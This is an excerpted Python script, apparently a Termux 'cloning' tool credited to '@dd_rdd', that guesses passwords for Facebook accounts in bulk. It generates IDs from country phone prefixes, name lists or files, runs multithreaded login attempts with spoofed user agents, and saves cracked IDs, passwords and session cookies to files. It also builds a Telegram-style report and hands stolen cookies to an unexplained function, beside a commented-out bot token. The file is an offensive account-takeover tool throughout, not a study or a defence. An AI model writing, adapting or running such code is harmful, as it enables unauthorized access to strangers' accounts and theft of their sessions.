...
os.system('pip install techspark')
...
from time import sleep
from techspark import *
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,techspark,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from os import path
...
SDM253 = "\u001b[38;5;253m"
SDM254 = "\u001b[38;5;254m"
#Hitlertok = '7126922670:AAF35Ghh_1eLGjtS-DYGbjsHMezHOwhqASs'
#Hitlerid = '6673453892'
...
g= datetime.datetime(2020, 8, 1, 0, 0 )
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\033[1;35m تم ايقاف الاداه راسل المطور حتى يفعلها الك ')
 time.sleep(1)
 print('\033[1;33m المطور هتلر    ')
 time.sleep(1)
 print('\033[1;35m  ♕𝐻𝐼𝒯𝐿𝐸𝑅♕')
 time.sleep(1)
 print('\033[1;31m 1')
 time.sleep(1)
 print('\033[1;35m 2')
...
import time
import requests
tooken=input('  \x1b[38;5;117m\x1b[38;5;117m✠\x1b[38;5;117m}  \x1b[38;5;117m🐉♤  ŦØ𝔨𝐄Ň  🍩♞  \x1b[38;5;196m ➢   \x1b[38;5;196m')
print('\033[2;35m')
print(' ▬▭▬▭▬▭▬▭▬▭▬▭ ')
IdD=input('  \x1b[1;32m{\x1b[1;35m✠\x1b[1;32m  ＩＤ \x1b[1;33m ➢  \x1b[1;33m')
...
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#import datetime;now = datetime.date.today();target = datetime.date(2024,9,30,)
#if now >=target:exit(" @dd_rddدخن لاتضوج راسلن افعلك الاداه")
#else:print("Run successfully✅")
os.system("pkg install espeak")
os.system('espeak -a 300 " Welcome friends   "')
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys


print('\n\033[1;35m Developer 𝐻𝐼𝒯𝐿𝐸𝑅😜...')
...
def new_file(cookies,access_token):
        ...
        for xd in range(fl):
                ...
                try:
                        ...
                        print(' 𝑵𝒐 𝒊𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏 ....')
        print('\n\033[1;92m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 100088,100089 etc\033[0;97m')
        try:
...
def sep():
        ...
        try:
                ...
                limit = 1
        print(f'{rg} File Path 𝐞𝐱𝐚𝐦𝐩𝐥𝐞 /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As 𝐞𝐱𝐚𝐦𝐩𝐥𝐞 /sdcard/newfile.txt{s}')
        ...
        print(44*"\033[0m-")
        input('\033[0m[𝙿𝚛𝚎𝚜𝚜 𝚎𝚗𝚝𝚎𝚛 𝚝𝚘 𝚋𝚊𝚌𝚔] ')
        main()
...
def double():
        ...
        try:
                ...
                print(' \n\033[1;32m𝐞𝐱𝐚𝐦𝐩𝐥𝐞: /sdcard/xxx.txt\n\033[1;32m')
...
def public():
        ...
        linex()
        print(' [1] 𝑴𝒆𝒕𝒉𝒐𝒅 1 (for new ids) \n [2] 𝑴𝒆𝒕𝒉𝒐𝒅 2 (for mix ids)\n [3] 𝑴𝒆𝒕𝒉𝒐𝒅 3 (for mic ids)')
        linex()
        mthd = input(' 𝑪𝒉𝒐𝒐𝒔𝒆 𝑴𝒆𝒕𝒉𝒐𝒅: ')
        linex()
        ...
        if cx in ['y','Y','yes','Yes','1']:
                ...
                pcp.append('n')
        linex()
        print('\033[1;36m 𝙳𝚞𝚖𝚙𝚒𝚗𝚐 𝚏𝚛𝚒𝚎𝚗𝚍 𝚕𝚒𝚜𝚝...\033[1;36m')
        linex()
        for userr in usrr:
                try:
                        ...
                        exit(f' 𝑵𝒐 𝒊𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏')
        try:
                plist = []
                try:
                        ps_limit = int(input(' 𝙷𝚘𝚠 𝚖𝚊𝚗𝚢 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍𝚜 𝚍𝚘 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚍𝚍 ? '))
                except:
                        ps_limit =1
                linex()
                ...
                for i in range(ps_limit):
                    plist.append(input(f' 𝐩𝐮𝐭 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝 {i+1}: '))
                
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' \x1b[1;93mTOTAL ID\033[1;32m'+total_ids)
                        linex()
                        for user in id:
                ...
                print('\033[1;32m')
                linex()
                print(' 𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
...
def crack():
                                        ...
                                        linex()
                                        input(' 𝙿𝚛𝚎𝚜𝚜 𝚎𝚗𝚝𝚎𝚛 𝚝𝚘 𝚋𝚊𝚌𝚔 menu ')
                                        crack()                                        
def menu():
        global lim,tp
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;32m [1] \x1b[1;31mFile cloning\n \x1b[1;32m[2] \x1b[1;31m Create file\n \x1b[1;32m[3] \x1b[1;31mpublic cloning\n')
                        linex()
                        xd=input(' 𝑪𝒉𝒐𝒐𝒔𝒆 > ')
                        if xd in ['1','01']:
                               
                                linex()
                                file = input(' FILE \033[1;33m: ')
                                try:
                                        ...
                                        menu()
                                linex()
                                print(' \x1b[1;32m[1] \x1b[1;32m𝐌𝐞𝐭𝐡𝐨𝐝 \x1b[1;32m1  \n \x1b[1;32m[2] \x1b[1;32m𝐌𝐞𝐭𝐡𝐨𝐝 \x1b[1;32m2 \n \x1b[1;91m[3] \x1b[1;32m𝐌𝐞𝐭𝐡𝐨𝐝 \x1b[1;32m3 ')
                                linex()
                                mthd=input(' 𝑪𝒉𝒐𝒐𝒔𝒆: ')
                                linex()
                                plist = []
                                print(f'\n\n\n{a26}[ 1 ] ✠➢  password number  .\n{m1}[ 2 ] ✠➢ NO . \n{B}[ 3 ] ✠➢ letters letters  . \n{V}[ 4 ] ✠➢ problem . \n');linex()
                                ppp=input(f'{U} Choice . _______➢   ') 
                                ...
                                if ppp in ['1','01']:
                                    ...
                                    plist.append('12341234@@')
                                        ...
                                        try:
                                                ...
                                                ps_limit =1
                                        linex()
                                        print('\033[1;36m exp: first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' 𝐩𝐮𝐭 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝{i+1}: '))
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;32mTOTAL ID\x1b[1;32m'+total_ids)
                                        print("\033[1;36m 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 𝐇𝐢𝐭𝐥𝐞𝐫🔥👉😜 ")
                                        print("\033[1;35m 𝐃𝐨𝐧'𝐭 𝐛𝐞 𝐚 𝐟𝐚𝐢𝐥𝐮𝐫𝐞🙌")
                                        print("\033[1;36m 𝐖𝐚𝐢𝐭, 𝐛𝐞 𝐩𝐚𝐭𝐢𝐞𝐧𝐭🔥")
                                        linex()
                                ...
                                exit(' 𝐎𝐩𝐭𝐢𝐨𝐧 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐦𝐞𝐧𝐮...')
                else:
                        print('𝐖𝐢𝐥𝐥 𝐛𝐞 ??𝐚𝐜𝐤 𝐬𝐨𝐨𝐧')
...
def za():
    ...
    if myid in str(body):
        ...
        print('\033[1;97mCopy the backup\033[1;37m(\033[1;95\033[1;37mContact me to purchase the tool )')
        linex()
        input("𝐩𝐫𝐞𝐬𝐬 𝐞𝐧𝐭𝐞𝐫 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐤𝐞𝐲")
        linex();print(" 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐩𝐚𝐢𝐝 𝐮𝐬𝐞𝐫 ");linex()
...
def pak():
                ...
                global lim
                clear()
                print('\033[1;33m 𝐂𝐨𝐝𝐞 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 0306,0315,0335,0345')
                code = input('\033[1;32m 𝚙𝚞𝚝 𝚌𝚘𝚍𝚎: ')
                try:
                        limit = int(input('\033[1;31m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                ...
                with tred(max_workers=30) as ASX:     
                        clear()
                        tl = str(len(user))
                        print(' TOTAL ID : \033[1;32m'+tl)
                        print(' \033[1;32m  The tool has been run')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                global lim
                clear()
                print('\033[1;33m 𝐂𝐨𝐝𝐞 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 016,017,018,019')
                code = input('\033[1;32m 𝚙𝚞𝚝 𝚌𝚘𝚍𝚎: ')
                try:
                        limit = int(input('\033[1;32m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                ...
                with tred(max_workers=30) as ASX:
                        ...
                        print(' TOTAL ID : \033[1;32m'+tl)
                        print(' \033[1;32m  The tool has been run')
                        print(f'\033[1;32m 𝐔𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐟𝐨𝐫 𝐬𝐩𝐞𝐞𝐝 𝐮𝐩 ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def afgan():
                ...
                global lim
                clear()
                print('\033[1;32m Codes: 070, 071, 072, 073, 074, 075, 076, 077, 078, 079')
                code = input('\033[1;31m 𝚙𝚞𝚝 𝚌𝚘𝚍𝚎: ')
                try:
                        limit = int(input('\033[1;21m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        tl = str(len(user))
                        print(' TOTAL ID : \033[1;32m'+tl)
                        print(' \033[1;36m  The tool has been run')
                        print(f'\033[1;31m 𝐔𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐟𝐨𝐫 𝐬𝐩𝐞𝐞𝐝 𝐮𝐩 ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def india():
                ...
                global lim
                clear()
                print('\033[1;32m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 8964,7684,8800,9717,etc')
                code = input('\033[1;31m 𝚙𝚞𝚝 𝚌𝚘𝚍𝚎: ')
                try:
                        limit = int(input('\033[1;32m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as ASX:     
                        clear()
                        tl = str(len(user))
                        print(' Total  ids : \033[1;31m'+tl)
                        print(f'\033[1;32m The tool has been run')
                        print(f'\033[1;31m 𝐔𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐟𝐨𝐫 𝐬𝐩𝐞𝐞𝐝 𝐮𝐩 ')
                        linex()
...
def gmail():
                ...
                global lim
                clear()
                print('\033[1;32m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: muhammad, ali, sajjad, faizan\033[1;92m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;31m 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: khan, awais, ali \033[1;32m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' 𝐞𝐱𝐚𝐦𝐩𝐥𝐞: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m@dd_rdd\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                Pr = '  ( 𝐻𝐼𝒯𝐿𝐸𝑅➢VIP) \n [ID] : '+ids+'\n[password] : '+pas+'\nCOOKIS  :'+kuki+'\n▬ ▭ ▬ ▭ ▬ ▭ ▬ ▭ ▬\nᴅᴇᴠ :@dd_rdd\n\n'
                                print('\r\r\033[1;31m [@dd_rdd-OK] %s | %s'%(ids,pas))
                                Hitlertele =(f"""DECODE BY @dd_rdd
[ 𝐻𝐼𝒯𝐿𝐸𝑅➢ ] account ready 
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▬▭
[ 𝐻𝐼𝒯𝐿𝐸𝑅➢ ] ID   » {ids}
...
👉😜@dd_rdd""")
                                ...
                                open('/sdcard/@dd_rdd-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@dd_rdd-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                Xapps_Golden(kuki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:                              
                                        print('\r\r\x1b[38;5;208m [@dd_rdd-CP] '+ids+' | '+pas+'\033[1;97m')
                                        
                                        
                                        open('/sdcard/@dd_rdd-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@dd_rdd] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                if 'session_key' in q:
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                        Pr = '  ( 𝐻𝐼𝒯𝐿𝐸𝑅➢VIP) \n[§] ɪᴅ : '+ids+'\n[§] ᴘᴀssᴡᴏʀᴅ : '+pas+'\nCOOKIS  :'+kuki+'\n▬ ▭ ▬ ▭ ▬ ▭ ▬ ▭ ▬\nᴅᴇᴠ : @dd_rdd\n\n'
                                        print('\r\r\033[1;32m [@dd_rdd-OK] '+ids+' | '+pas+'\033[1;97m')
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@dd_rddCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@dd_rdd-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@dd_rdd-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@dd_rdd_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@dd_rdd-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@dd_rdd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
